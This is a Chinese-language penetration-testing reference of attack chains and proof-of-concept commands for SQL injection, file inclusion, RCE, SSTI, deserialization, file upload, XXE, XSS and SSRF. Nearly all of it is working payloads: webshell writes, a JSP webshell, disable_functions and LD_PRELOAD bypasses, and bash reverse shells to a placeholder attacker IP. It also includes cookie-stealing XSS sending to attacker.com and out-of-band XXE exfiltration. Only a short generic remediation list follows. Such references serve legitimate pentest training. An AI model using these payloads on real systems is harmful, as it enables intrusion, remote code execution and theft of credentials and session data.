# 攻击链与POC

> **本文档用途**: 详细的攻击步骤和可执行的POC代码  
> **目标读者**: 渗透测试人员、安全研究人员  
> **内容特点**: 攻击链分析 + 完整POC + 多语言示例  
> **相关文档**:
> - [漏洞案例库](vulnerability-cases.md) - 查看漏洞案例
> - [漏洞分析方法](vulnerability-analysis.md) - 学习分析思路

---

## 1. SQL注入漏洞

### 1.1 PHP SQL注入详细攻击链

**代码层面攻击链**：
1. **输入接收**：`$id = $_GET['id'];` 直接接收用户输入
2. **SQL拼接**：`$sql = "SELECT * FROM users WHERE id='$id'";` 未过滤直接拼接
3. **SQL执行**：`$result = mysql_query($sql);` 执行恶意SQL语句
4. **结果返回**：`mysql_fetch_array($result);` 返回敏感数据

**具体攻击步骤**：
1. 构造基础注入Payload：`id=1' OR 1=1 --+`
2. 执行联合查询获取数据库结构：`id=1' UNION SELECT table_name,column_name,3 FROM information_schema.columns WHERE table_schema=database() --+`
3. 获取敏感数据：`id=1' UNION SELECT username,password,3 FROM users --+`
4. 写入Webshell（如果有权限）：`id=1' INTO OUTFILE '/var/www/html/shell.php' FIELDS TERMINATED BY '<php>system($_GET[cmd]);</php>' --+`
5. 执行系统命令（如果数据库支持）：`id=1'; EXEC xp_cmdshell('dir') --+`

**完整POC**：
```bash
# 1. 基础注入 - 获取所有用户
curl "http://example.com/user.php?id=1' OR 1=1 --+"

# 2. 联合查询 - 获取数据库结构
curl "http://example.com/user.php?id=1' UNION SELECT table_name,column_name,3 FROM information_schema.columns WHERE table_schema=database() --+"

# 3. 获取敏感数据 - 用户名密码
curl "http://example.com/user.php?id=1' UNION SELECT username,password,3 FROM users --+"

# 4. 时间盲注 - 逐字符获取密码
for i in $(seq 1 32); do 
  for c in $(seq 48 122); do 
    curl -s "http://example.com/user.php?id=1' AND IF(SUBSTRING((SELECT password FROM users WHERE username='admin'),$i,1)=CHAR($c),SLEEP(2),1) --+" | wc -m | grep -q 0 && echo -n "$(printf "\\x$(printf %x $c)")" && break;
  done;
done

# 5. 宽字节注入（GBK编码）
curl "http://example.com/user.php?id=1%df' OR 1=1 --+"
```

### 1.2 Java SQL注入详细攻击链

**代码层面攻击链**：
1. **输入接收**：`String id = request.getParameter("id");` 直接接收用户输入
2. **SQL拼接**：`String sql = "SELECT id, name, url FROM websites where id=" + id;` 未过滤直接拼接
3. **Statement创建**：`Statement stmt = conn.createStatement();` 创建普通Statement
4. **SQL执行**：`ResultSet rs = stmt.executeQuery(sql);` 执行恶意SQL语句
5. **结果处理**：遍历ResultSet返回敏感数据

**具体攻击步骤**：
1. 构造基础注入Payload：`id=1 OR 1=1`
2. 执行联合查询获取数据库信息：`id=1 UNION SELECT table_name, column_name, 3 FROM information_schema.columns WHERE table_schema=database()`
3. 获取敏感数据：`id=1 UNION SELECT username, password, 3 FROM users`
4. 绕过认证：`id=1 OR username='admin'`

**完整POC**：
```bash
# 1. 基础注入 - 获取所有数据
curl "http://example.com/sqltestServlet?id=1 OR 1=1"

# 2. 联合查询 - 获取数据库结构
curl "http://example.com/sqltestServlet?id=1 UNION SELECT table_name, column_name, 3 FROM information_schema.columns WHERE table_schema=database()"

# 3. 获取敏感数据 - 用户名密码
curl "http://example.com/sqltestServlet?id=1 UNION SELECT username, password, 3 FROM users"

# 4. 绕过认证 - 直接登录管理员
curl "http://example.com/loginServlet?username=admin' --+&password=任意值"
```

### 1.3 JavaScript/Node.js SQL注入详细攻击链

**代码层面攻击链**：
1. **输入接收**：`const userID = req.query.user_id;` 直接接收用户输入
2. **SQL拼接**：`db.query('SELECT * FROM users WHERE id = ' + userID, ...)` 未过滤直接拼接
3. **SQL执行**：执行恶意SQL语句
4. **结果返回**：`res.json(results);` 返回敏感数据

**具体攻击步骤**：
1. 构造基础注入Payload：`user_id=1 OR 1=1`
2. 执行联合查询获取数据库结构
3. 获取敏感数据
4. 执行堆叠注入（如果支持）

**完整POC**：
```bash
# 1. 基础注入 - 获取所有用户
curl "http://example.com/user?user_id=1 OR 1=1"

# 2. 联合查询 - 获取数据库信息
curl "http://example.com/user?user_id=1 UNION SELECT table_name, column_name FROM information_schema.columns WHERE table_schema=database()"

# 3. 写入Webshell
curl "http://example.com/user?user_id=1 INTO OUTFILE '/var/www/html/shell.js' FIELDS TERMINATED BY 'const http = require(\"http\"); http.createServer((req, res) => { exec(req.url.split(\"?cmd=\")[1], (err, stdout) => { res.end(stdout); }); }).listen(3000);'"
```

## 2. 文件包含漏洞

### 2.1 PHP文件包含详细攻击链

**代码层面攻击链**：
1. **输入接收**：`$file = $_GET['file'];` 直接接收用户输入
2. **文件包含**：`include($file);` 或 `require($file);` 未过滤直接包含
3. **代码执行**：执行包含文件中的恶意代码

**具体攻击步骤**：
1. 本地文件包含（LFI）：`file=../../etc/passwd`
2. 远程文件包含（RFI）：`file=http://attacker.com/shell.txt`（需开启allow_url_include）
3. PHP包装器利用：`file=php://filter/read=convert.base64-encode/resource=index.php`
4. 会话文件包含：`file=/tmp/sess_$sessionid`（结合PHPSESSID注入）

**完整POC**：
```bash
# 1. 本地文件包含 - 读取系统文件
curl "http://example.com/include.php?file=../../etc/passwd"

# 2. 远程文件包含 - 执行远程代码
curl "http://example.com/include.php?file=http://attacker.com/shell.txt"

# 3. PHP包装器 - 读取源码
curl "http://example.com/include.php?file=php://filter/read=convert.base64-encode/resource=config.php"

# 4. 会话文件包含攻击链
# 步骤1: 注入恶意代码到会话
curl "http://example.com/login.php?user=<?php system('ls -la'); ?>"
# 步骤2: 获取PHPSESSID
# 步骤3: 包含会话文件
curl "http://example.com/include.php?file=/tmp/sess_<PHPSESSID>"

# 5. 利用/proc/self/environ
curl "http://example.com/include.php?file=/proc/self/environ&cmd=system('ls -la');"
```

## 3. 远程代码执行（RCE）

### 3.1 PHP RCE详细攻击链

**代码层面攻击链**：
1. **输入接收**：`$code = $_GET['code'];` 直接接收用户输入
2. **代码执行**：`eval($code);` 或 `assert($code);` 执行恶意代码
3. **系统命令执行**：`system()`, `exec()`, `shell_exec()` 等函数执行系统命令

**具体攻击步骤**：
1. 使用eval()执行代码：`code=phpinfo();`
2. 执行系统命令：`code=system('ls -la');`
3. 写入Webshell：`code=file_put_contents('shell.php', '<?php system($_GET[cmd]); ?>');`
4. 权限提升：`code=system('id');`

**完整POC**：
```bash
# 1. 基础代码执行 - 查看PHP信息
curl "http://example.com/rce.php?code=phpinfo();"

# 2. 执行系统命令 - 列出文件
curl "http://example.com/rce.php?code=system('ls -la');"

# 3. 写入Webshell
curl "http://example.com/rce.php?code=file_put_contents('shell.php', '<?php system($_GET[cmd]); ?>');"

# 4. 访问Webshell
curl "http://example.com/shell.php?cmd=whoami"

# 5. 使用call_user_func执行命令
curl "http://example.com/rce.php?func=system&param=ls -la"

# 6. 使用array_map执行命令
curl "http://example.com/rce.php?func=system&param=id"
```

### 3.2 Java RCE详细攻击链

**代码层面攻击链**：
1. **输入接收**：`String cmd = request.getParameter("cmd");` 直接接收用户输入
2. **命令拼接**：`String[] cmdArray = {"cmd", "/C", "ping " + cmd};` 未过滤直接拼接
3. **进程执行**：`Runtime.getRuntime().exec(cmdArray);` 执行恶意命令
4. **结果返回**：读取并返回命令执行结果

**具体攻击步骤**：
1. 构造命令注入Payload：`cmd=127.0.0.1&dir`
2. 执行系统命令：`cmd=127.0.0.1&whoami`
3. 读取敏感文件：`cmd=127.0.0.1&type C:\Windows\win.ini`
4. 权限提升：`cmd=127.0.0.1&net localgroup administrators`

**完整POC**：
```bash
# 1. 基础命令注入 - 执行dir命令
curl "http://example.com/execServlet?ip=127.0.0.1%26dir"

# 2. 执行whoami命令
curl "http://example.com/execServlet?ip=127.0.0.1%26whoami"

# 3. 读取敏感文件
curl "http://example.com/execServlet?ip=127.0.0.1%26type%20C:\\Windows\\win.ini"

# 4. 权限提升检测
curl "http://example.com/execServlet?ip=127.0.0.1%26net%20localgroup%20administrators"

# 5. 反弹Shell
# 步骤1: 在攻击者服务器启动监听
# nc -lvp 4444
# 步骤2: 执行反弹Shell命令
curl "http://example.com/execServlet?ip=127.0.0.1%26bash%20-c%20%27bash%20-i%20%3E%26%20/dev/tcp/attacker_ip/4444%200%3E%261%27"
```

## 4. URL重定向漏洞

### 4.1 PHP URL重定向详细攻击链

**代码层面攻击链**：
1. **输入接收**：`$url = $_GET['url'];` 直接接收用户输入
2. **重定向执行**：`header("Location: $url");` 未验证直接重定向
3. **用户跳转**：浏览器跳转到恶意网站

**具体攻击步骤**：
1. 构造基础重定向Payload：`url=http://attacker.com`
2. 构造钓鱼链接：`url=http://attacker.com/login.php?return_url=http://example.com`
3. 绕过URL验证（如果有）：`url=//attacker.com` 或 `url=/\/attacker.com`
4. 结合XSS：`url=javascript:alert('XSS')`

**完整POC**：
```bash
# 1. 基础重定向 - 跳转到恶意网站
curl -I "http://example.com/redirect.php?url=http://attacker.com"

# 2. 构造钓鱼链接 - 伪装成合法登录
curl -I "http://example.com/redirect.php?url=http://attacker.com/login.php?return_url=http://example.com"

# 3. 绕过URL验证 - 使用//前缀
curl -I "http://example.com/redirect.php?url=//attacker.com"

# 4. 绕过URL验证 - 使用/\/前缀
curl -I "http://example.com/redirect.php?url=/\\/attacker.com"

# 5. JavaScript伪协议 - 执行XSS
curl "http://example.com/redirect.php?url=javascript:alert('XSS')"

# 6. 构造完整钓鱼链接
# http://example.com/redirect.php?url=http://attacker.com/phishing.php?site=example.com&token=12345
```

## 5. Python代码注入

### 5.1 Python代码注入详细攻击链

**代码层面攻击链**：
1. **输入接收**：`code = request.args.get('code');` 直接接收用户输入
2. **代码执行**：`eval(code)` 或 `exec(code)` 执行恶意代码
3. **系统命令执行**：`os.system()`, `subprocess.Popen()` 等执行系统命令

**具体攻击步骤**：
1. 使用eval()执行代码：`code=1+1`
2. 执行系统命令：`code=__import__('os').system('ls -la')`
3. 写入Webshell：`code=open('shell.py', 'w').write('import os; os.system(input())')`
4. 权限提升：`code=__import__('os').system('id')`

**完整POC**：
```bash
# 1. 基础代码执行 - 计算表达式
curl "http://example.com/inject.py?code=1+1"

# 2. 执行系统命令 - 列出文件
curl "http://example.com/inject.py?code=__import__('os').system('ls -la')"

# 3. 执行系统命令 - 查看当前用户
curl "http://example.com/inject.py?code=__import__('os').popen('whoami').read()"

# 4. 写入Webshell
curl "http://example.com/inject.py?code=open('shell.py', 'w').write('import os; os.system(input())')"

# 5. 执行复杂命令 - 反弹Shell
curl "http://example.com/inject.py?code=__import__('os').system('bash -c \'bash -i >& /dev/tcp/attacker_ip/4444 0>&1\'')"

# 6. 使用subprocess执行命令
curl "http://example.com/inject.py?code=__import__('subprocess').Popen('ls -la', shell=True, stdout=__import__('subprocess').PIPE).stdout.read()"
```

## 6. Python反序列化漏洞

### 6.1 Python反序列化详细攻击链

**代码层面攻击链**：
1. **输入接收**：`data = request.get_data();` 接收序列化数据
2. **反序列化执行**：`pickle.loads(data)` 或 `yaml.load(data)` 执行反序列化
3. **恶意代码执行**：`__reduce__` 方法或其他魔术方法执行恶意代码

**具体攻击步骤**：
1. 构造pickle恶意数据：使用`__reduce__`方法
2. 构造PyYAML恶意数据：使用`!!python/object/apply`
3. 发送恶意数据：通过POST请求发送
4. 执行系统命令：反序列化过程中执行系统命令

**完整POC**：
```python
# 1. pickle反序列化攻击
import pickle
import os

class Exploit:
    def __reduce__(self):
        return (os.system, ('ls -la',))

exploit = Exploit()
payload = pickle.dumps(exploit)

# 发送Payload
import requests
response = requests.post('http://example.com/deserialize.py', data=payload)
print(response.text)

# 2. PyYAML反序列化攻击
import yaml

# 构造恶意YAML数据
yaml_payload = "!!python/object/apply:os.system ['ls -la']"

# 发送Payload
response = requests.post('http://example.com/deserialize.py', data=yaml_payload)
print(response.text)

# 3. 反弹Shell攻击
class ReverseShell:
    def __reduce__(self):
        cmd = "bash -c 'bash -i >& /dev/tcp/attacker_ip/4444 0>&1'"
        return (os.system, (cmd,))

payload = pickle.dumps(ReverseShell())
response = requests.post('http://example.com/deserialize.py', data=payload)
```

## 7. Python SSTI漏洞

### 7.1 Python SSTI详细攻击链

**代码层面攻击链**：
1. **输入接收**：`name = request.args.get('name');` 接收用户输入
2. **模板拼接**：`template = f"Hello, {name}!";` 直接拼接模板
3. **模板渲染**：`render_template_string(template)` 渲染恶意模板
4. **代码执行**：模板引擎执行恶意代码

**具体攻击步骤**：
1. 构造基础SSTI Payload：`name={{7*7}}`
2. 执行系统命令：`name={{config.__class__.__init__.__globals__['os'].popen('ls -la').read()}}`
3. 读取敏感文件：`name={{__import__('os').popen('cat /etc/passwd').read()}}`
4. 写入Webshell：`name={{__import__('os').popen('echo \'import os; os.system(input())\' > shell.py').read()}}`

**完整POC**：
```bash
# 1. 基础SSTI - 执行数学运算
curl "http://example.com/ssti.py?name={{7*7}}"

# 2. 执行系统命令 - 列出文件
curl "http://example.com/ssti.py?name={{config.__class__.__init__.__globals__['os'].popen('ls -la').read()}}"

# 3. 执行系统命令 - 查看当前用户
curl "http://example.com/ssti.py?name={{__import__('os').popen('whoami').read()}}"

# 4. 读取敏感文件
curl "http://example.com/ssti.py?name={{__import__('os').popen('cat /etc/passwd').read()}}"

# 5. 写入Webshell
curl "http://example.com/ssti.py?name={{__import__('os').popen('echo \'import os; os.system(input())\' > shell.py').read()}}"

# 6. 反弹Shell
curl "http://example.com/ssti.py?name={{__import__('os').popen('bash -c \'bash -i >& /dev/tcp/attacker_ip/4444 0>&1\'').read()}}"

# 7. 使用不同的模板引擎Payload
# Jinja2
curl "http://example.com/ssti.py?name={{request.application.__globals__.__builtins__.__import__('os').popen('ls -la').read()}}"
# Mako
curl "http://example.com/ssti.py?name=${__import__('os').system('ls -la')}"
# Tornado
curl "http://example.com/ssti.py?name={{handler.settings.get('__import__')('os').system('ls -la')}}"
```

## 8. PHP配置安全漏洞

### 8.1 open_basedir绕过详细攻击链

**代码层面攻击链**：
1. **配置限制**：`ini_set('open_basedir', '/var/www/html');` 设置目录限制
2. **绕过尝试**：使用realpath()、SplFileInfo::getRealPath()等函数
3. **目录爆破**：通过错误信息推断文件是否存在
4. **文件访问**：成功绕过限制访问敏感文件

**具体攻击步骤**：
1. 检测open_basedir限制：尝试访问`/etc/passwd`
2. 使用realpath()爆破：`file=../../../etc/passwd`
3. 使用SplFileInfo::getRealPath()：`new SplFileInfo('/etc/passwd')`
4. 使用glob()函数：`glob('/*')`
5. 使用chdir()和getcwd()：切换目录后获取当前路径

**完整POC**：
```bash
# 1. 检测open_basedir限制
curl "http://example.com/test.php?file=/etc/passwd"

# 2. 使用realpath()爆破目录
curl "http://example.com/test.php?file=../../../etc/passwd"

# 3. 使用PHP包装器
curl "http://example.com/test.php?file=php://filter/read=convert.base64-encode/resource=/etc/passwd"

# 4. 使用glob()函数
curl "http://example.com/test.php?func=glob&param=/*"

# 5. 使用chdir()和getcwd()
curl "http://example.com/test.php?cmd=chdir('../..'); echo getcwd();"

# 6. 使用Symlink
# 步骤1: 创建符号链接
curl "http://example.com/upload.php?file=@symlink.sh"
# 步骤2: 执行符号链接
curl "http://example.com/test.php?file=symlink"

# 7. 使用PHP 5.3.4+ 真实路径缓存绕过
curl "http://example.com/test.php?file=/var/www/html/../etc/passwd"
```

### 8.2 allow_url_fopen和allow_url_include安全漏洞

**代码层面攻击链**：
1. **配置设置**：`allow_url_fopen=On`, `allow_url_include=On` 开启远程文件访问
2. **输入接收**：`$file = $_GET['file'];` 接收用户输入
3. **远程文件包含**：`include($file);` 包含远程恶意文件
4. **代码执行**：执行远程文件中的恶意代码

**具体攻击步骤**：
1. 检测配置：`phpinfo()` 查看allow_url_fopen和allow_url_include状态
2. 远程文件包含：`file=http://attacker.com/shell.txt`
3. 使用data伪协议：`file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdscyAtbGEpOyA/Pg==`
4. 使用php://input：POST发送PHP代码
5. 使用ftp://协议：`file=ftp://attacker.com/shell.txt`

**完整POC**：
```bash
# 1. 检测配置状态
curl "http://example.com/phpinfo.php"

# 2. 远程文件包含 - 包含远程shell
curl "http://example.com/include.php?file=http://attacker.com/shell.txt"

# 3. 使用data伪协议 - 执行base64编码的代码
curl "http://example.com/include.php?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdscyAtbGEpOyA/Pg=="

# 4. 使用data伪协议 - 执行URL编码的代码
curl "http://example.com/include.php?file=data://text/plain,%3C%3Fphp%20system('ls%20-la');%20%3F%3E"

# 5. 使用php://input - POST发送代码
curl -X POST "http://example.com/include.php?file=php://input" \
  -d "<?php system('ls -la'); ?>"

# 6. 使用ftp://协议
curl "http://example.com/include.php?file=ftp://attacker.com/shell.txt"

# 7. 构造完整攻击链
# 步骤1: 在攻击者服务器创建shell.txt文件，内容为: <?php system($_GET['cmd']); ?>
# 步骤2: 执行远程包含
curl "http://example.com/include.php?file=http://attacker.com/shell.txt&cmd=ls -la"
```

### 8.3 disable_functions绕过详细攻击链

**代码层面攻击链**：
1. **配置限制**：`disable_functions = system,exec,shell_exec,passthru` 禁用危险函数
2. **绕过尝试**：使用其他未禁用的函数
3. **系统命令执行**：成功绕过限制执行系统命令

**具体攻击步骤**：
1. 检测禁用函数：尝试执行`system('ls')`
2. 使用mail()函数结合bash破壳漏洞：`mail('a@localhost', '', '', '', '-bv')`
3. 使用LD_PRELOAD：上传恶意共享库并设置环境变量
4. 使用PHP扩展：如FFI、Swoole等
5. 使用pcntl_exec()：如果启用了pcntl扩展
6. 使用proc_open()：如果未被禁用

**完整POC**：
```bash
# 1. 检测禁用函数
curl "http://example.com/test.php?cmd=system('ls -la');"

# 2. 使用mail()函数结合bash破壳漏洞
curl "http://example.com/test.php?cmd=putenv('PHP_LOL=() { x; }; ls -la > /tmp/result.txt'); mail('a@localhost', '', '', '', '-bv');"

# 3. 使用LD_PRELOAD
# 步骤1: 上传恶意共享库
curl -X POST "http://example.com/upload.php" \
  -F "file=@evil.so"
# 步骤2: 执行LD_PRELOAD攻击
curl "http://example.com/test.php?cmd=putenv('LD_PRELOAD=/var/www/html/evil.so'); mail('a@localhost', '', '', '');"

# 4. 使用pcntl_exec()
curl "http://example.com/test.php?cmd=pcntl_exec('/bin/sh', array('-c', 'ls -la > /tmp/result.txt'));"

# 5. 使用proc_open()
curl "http://example.com/test.php?cmd=$descriptorspec = array(0 => array('pipe', 'r'), 1 => array('pipe', 'w'), 2 => array('pipe', 'w')); $process = proc_open('ls -la', $descriptorspec, $pipes); echo stream_get_contents($pipes[1]);"

# 6. 使用PHP FFI
curl "http://example.com/test.php?cmd=if(extension_loaded('ffi')) { $ffi = FFI::cdef('int system(const char *command);', 'libc.so.6'); $ffi->system('ls -la'); }"

# 7. 使用Swoole
curl "http://example.com/test.php?cmd=if(extension_loaded('swoole')) { $process = new Swoole\Process(function($worker) { $worker->exec('/bin/sh', array('-c', 'ls -la')); }); $process->start(); }"
```

## 9. Java文件上传漏洞

### 9.1 Java文件上传详细攻击链

**代码层面攻击链**：
1. **文件接收**：`ServletFileUpload.parseRequest(request)` 解析上传文件
2. **文件存储**：`item.write(storeFile)` 未验证直接存储
3. **文件访问**：浏览器访问上传的恶意文件
4. **代码执行**：服务器执行恶意文件中的代码

**具体攻击步骤**：
1. 检测文件上传点：`/uploadServlet`
2. 上传基础JSP WebShell：`shell.jsp`
3. 上传多文件绕过：同时上传合法文件和恶意文件
4. 上传路径遍历：`../shell.jsp`
5. 上传文件名混淆：`shell.jsp;.jpg` 或 `shell.jsp%00.jpg`
6. 上传内容混淆：在图片文件中嵌入JSP代码

**完整POC**：
```bash
# 1. 基础文件上传 - 上传JSP WebShell
curl -X POST "http://example.com/uploadServlet" \
  -F "file=@shell.jsp"

# 2. 上传WebShell内容
# shell.jsp内容：
# <%@ page import="java.io.*" %>
# <% String cmd = request.getParameter("cmd");
# Process p = Runtime.getRuntime().exec(cmd);
# BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
# String line;
# while ((line = br.readLine()) != null) {
#     out.println(line);
# }
# br.close();
# %>

# 3. 访问WebShell执行命令
curl "http://example.com/upload/shell.jsp?cmd=ls -la"

# 4. 上传路径遍历攻击
curl -X POST "http://example.com/uploadServlet" \
  -F "file=@shell.jsp;filename=../shell.jsp"

# 5. 上传文件名混淆
curl -X POST "http://example.com/uploadServlet" \
  -F "file=@shell.jsp;filename=shell.jsp;.jpg"

# 6. 上传内容混淆 - 图片中嵌入JSP代码
# 步骤1: 创建包含JSP代码的图片
# echo '<%@ page import="java.io.*" %><% Runtime.getRuntime().exec(request.getParameter("cmd")); %>' > shell.jpg
# 步骤2: 上传图片
curl -X POST "http://example.com/uploadServlet" \
  -F "file=@shell.jpg"
# 步骤3: 访问图片文件（如果服务器解析.jpg为JSP）
curl "http://example.com/upload/shell.jpg?cmd=ls -la"

# 7. 大文件上传DoS
curl -X POST "http://example.com/uploadServlet" \
  -F "file=@large_file.bin"
```

## 10. Java反序列化漏洞

### 10.1 Java反序列化详细攻击链

**代码层面攻击链**：
1. **输入接收**：`request.getInputStream()` 接收序列化数据
2. **反序列化执行**：`ObjectInputStream.readObject()` 执行反序列化
3. **恶意代码执行**：`readObject()`方法中的恶意代码被执行
4. **系统命令执行**：通过反射、动态类加载等执行系统命令

**具体攻击步骤**：
1. 检测反序列化点：发送非序列化数据触发异常
2. 使用ysoserial生成恶意序列化数据：`java -jar ysoserial.jar CommonsCollections9 "ls -la" > payload.bin`
3. 发送恶意数据：POST请求发送payload.bin
4. 执行系统命令：验证命令执行结果
5. 反弹Shell：构造反弹Shell的payload

**完整POC**：
```bash
# 1. 检测反序列化点
curl -X POST "http://example.com/exec2Servlet" \
  -d "test"

# 2. 使用ysoserial生成恶意序列化数据
# 步骤1: 下载ysoserial
# wget https://github.com/frohoff/ysoserial/releases/download/v0.0.6/ysoserial-0.0.6-SNAPSHOT-all.jar
# 步骤2: 生成payload
java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections9 "ls -la" > payload.bin

# 3. 发送恶意数据
curl -X POST "http://example.com/exec2Servlet" \
  --data-binary @payload.bin

# 4. 执行系统命令 - 查看当前用户
java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections9 "whoami" > payload.bin
curl -X POST "http://example.com/exec2Servlet" \
  --data-binary @payload.bin

# 5. 反弹Shell
java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections9 "bash -c 'bash -i >& /dev/tcp/attacker_ip/4444 0>&1'" > payload.bin
curl -X POST "http://example.com/exec2Servlet" \
  --data-binary @payload.bin

# 6. 使用不同的Gadget
# CommonsBeanutils1
java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsBeanutils1 "ls -la" > payload.bin
# URLDNS（无回显检测）
java -jar ysoserial-0.0.6-SNAPSHOT-all.jar URLDNS "http://your-domain.com" > payload.bin
# Jdk7u21
java -jar ysoserial-0.0.6-SNAPSHOT-all.jar Jdk7u21 "ls -la" > payload.bin
```

## 11. Java XXE漏洞

### 11.1 Java XXE详细攻击链

**代码层面攻击链**：
1. **输入接收**：`request.getInputStream()` 接收XML数据
2. **XML解析**：`DocumentBuilder.parse()` 解析XML文档
3. **外部实体处理**：`DocumentBuilderFactory` 未禁用外部实体
4. **文件读取**：解析器读取外部实体指定的文件
5. **数据返回**：将文件内容返回给攻击者

**具体攻击步骤**：
1. 检测XXE点：发送基础XML数据
2. 构造基础XXE Payload：读取`/etc/passwd`
3. 构造带外XXE：使用DNS请求或HTTP请求
4. 构造盲XXE：结合错误消息或时间延迟
5. 构造多文件读取：使用多个外部实体

**完整POC**：
```bash
# 1. 检测XXE点
curl -X POST "http://example.com/xxeServlet" \
  -H "Content-Type: application/xml" \
  -d "<?xml version='1.0'?><test>test</test>"

# 2. 基础XXE - 读取/etc/passwd
curl -X POST "http://example.com/xxeServlet" \
  -H "Content-Type: application/xml" \
  -d "<?xml version='1.0'?><!DOCTYPE test [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><test>&xxe;</test>"

# 3. 基础XXE - 读取Windows文件
curl -X POST "http://example.com/xxeServlet" \
  -H "Content-Type: application/xml" \
  -d "<?xml version='1.0'?><!DOCTYPE test [<!ENTITY xxe SYSTEM 'file:///C:/Windows/win.ini'>]><test>&xxe;</test>"

# 4. 带外XXE - DNS请求
curl -X POST "http://example.com/xxeServlet" \
  -H "Content-Type: application/xml" \
  -d "<?xml version='1.0'?><!DOCTYPE test [<!ENTITY xxe SYSTEM 'http://your-domain.com/test'>]><test>&xxe;</test>"

# 5. 带外XXE - HTTP请求（读取文件并发送）
curl -X POST "http://example.com/xxeServlet" \
  -H "Content-Type: application/xml" \
  -d "<?xml version='1.0'?><!DOCTYPE test [<!ENTITY % file SYSTEM 'file:///etc/passwd'><!ENTITY % dtd SYSTEM 'http://your-domain.com/evil.dtd'>%dtd;]><test>&send;</test>"

# 6. 盲XXE - 结合错误消息
curl -X POST "http://example.com/xxeServlet" \
  -H "Content-Type: application/xml" \
  -d "<?xml version='1.0'?><!DOCTYPE test [<!ENTITY xxe SYSTEM 'file:///nonexistent/file'>]><test>&xxe;</test>"

# 7. 使用不同的协议
# FTP协议
curl -X POST "http://example.com/xxeServlet" \
  -H "Content-Type: application/xml" \
  -d "<?xml version='1.0'?><!DOCTYPE test [<!ENTITY xxe SYSTEM 'ftp://your-domain.com/test'>]><test>&xxe;</test>"
# jar协议
curl -X POST "http://example.com/xxeServlet" \
  -H "Content-Type: application/xml" \
  -d "<?xml version='1.0'?><!DOCTYPE test [<!ENTITY xxe SYSTEM 'jar:file:///path/to/file.jar!/file.txt'>]><test>&xxe;</test>"
```

## 12. Java XSS漏洞

### 12.1 Java XSS详细攻击链

**代码层面攻击链**：
1. **输入接收**：`String name = request.getParameter("name");` 接收用户输入
2. **输出渲染**：`out.println("Hello, " + name);` 未过滤直接输出
3. **浏览器执行**：浏览器执行嵌入的JavaScript代码
4. **会话窃取**：通过document.cookie获取用户会话

**具体攻击步骤**：
1. 检测XSS点：发送`<script>alert('XSS')</script>`
2. 构造存储型XSS：提交恶意评论
3. 构造反射型XSS：URL参数注入
4. 构造DOM型XSS：操纵DOM元素
5. 构造窃取cookie的XSS：`document.location='http://attacker.com/steal.php?cookie='+document.cookie`

**完整POC**：
```bash
# 1. 基础反射型XSS
curl "http://example.com/xssServlet?name=<script>alert('XSS')</script>"

# 2. 存储型XSS
curl -X POST "http://example.com/commentServlet" \
  -d "comment=<script>alert('Stored XSS')</script>"

# 3. DOM型XSS
curl "http://example.com/domxssServlet?param=<script>alert('DOM XSS')</script>"

# 4. 窃取cookie的XSS
curl "http://example.com/xssServlet?name=<script>document.location='http://attacker.com/steal.php?cookie='+document.cookie</script>"

# 5. 绕过XSS过滤 - 使用事件属性
curl "http://example.com/xssServlet?name=<div onmouseover=alert('XSS')>Hover me</div>"

# 6. 绕过XSS过滤 - 使用大小写混淆
curl "http://example.com/xssServlet?name=<ScRiPt>alert('XSS')</ScRiPt>"

# 7. 绕过XSS过滤 - 使用HTML实体
curl "http://example.com/xssServlet?name=%3Cscript%3Ealert('XSS')%3C/script%3E"

# 8. 执行复杂操作的XSS
curl "http://example.com/xssServlet?name=<script>var xhr=new XMLHttpRequest();xhr.open('POST','http://attacker.com/steal.php',true);xhr.setRequestHeader('Content-Type','application/x-www-form-urlencoded');xhr.send('cookie='+document.cookie+'&page='+document.URL);</script>"

# 9. 使用SVG的XSS
curl "http://example.com/xssServlet?name=<svg onload=alert('XSS')>"

# 10. 使用iframe的XSS
curl "http://example.com/xssServlet?name=<iframe src=javascript:alert('XSS')>"
```

## 13. Java SSRF漏洞

### 13.1 Java SSRF详细攻击链

**代码层面攻击链**：
1. **输入接收**：`String url = request.getParameter("url");` 接收用户输入
2. **URL连接**：`new URL(url).openConnection()` 建立连接
3. **数据获取**：`conn.getInputStream()` 获取远程资源
4. **结果返回**：将远程资源内容返回给攻击者

**具体攻击步骤**：
1. 检测SSRF点：发送`http://example.com`
2. 构造内部服务访问：`http://localhost:8080`
3. 构造文件读取：`file:///etc/passwd`
4. 构造Redis攻击：`redis://localhost:6379`
5. 构造Memcached攻击：`memcached://localhost:11211`
6. 构造MySQL攻击：`mysql://localhost:3306`

**完整POC**：
```bash
# 1. 检测SSRF点
curl "http://example.com/ssrfServlet?url=http://example.com"

# 2. 访问内部服务
curl "http://example.com/ssrfServlet?url=http://localhost:8080"

# 3. 读取本地文件
curl "http://example.com/ssrfServlet?url=file:///etc/passwd"

# 4. 读取Windows文件
curl "http://example.com/ssrfServlet?url=file:///C:/Windows/win.ini"

# 5. 访问内部Redis服务
curl "http://example.com/ssrfServlet?url=http://localhost:6379"

# 6. 构造Redis攻击
curl "http://example.com/ssrfServlet?url=http://localhost:6379/set/test/123"

# 7. 访问内部数据库
curl "http://example.com/ssrfServlet?url=http://localhost:3306"

# 8. 构造带外SSRF
curl "http://example.com/ssrfServlet?url=http://your-domain.com/test"

# 9. 绕过URL验证 - 使用@符号
curl "http://example.com/ssrfServlet?url=http://example.com@localhost:8080"

# 10. 绕过URL验证 - 使用#符号
curl "http://example.com/ssrfServlet?url=http://localhost:8080#example.com"

# 11. 绕过URL验证 - 使用?符号
curl "http://example.com/ssrfServlet?url=http://localhost:8080?example.com"

# 12. 使用不同的协议
# dict协议
curl "http://example.com/ssrfServlet?url=dict://localhost:22/info"
# gopher协议
curl "http://example.com/ssrfServlet?url=gopher://localhost:6379/_set%20test%20123"
# ldap协议
curl "http://example.com/ssrfServlet?url=ldap://localhost:389/test"
```

## 14. 修复建议汇总

### 14.1 通用修复建议

**输入验证**：
- 对所有用户输入进行严格验证
- 使用白名单而非黑名单
- 对输入进行类型转换和边界检查
- 使用参数化查询处理SQL语句

**输出编码**：
- 对所有输出进行适当的编码
- HTML输出使用HTML实体编码
- URL输出使用URL编码
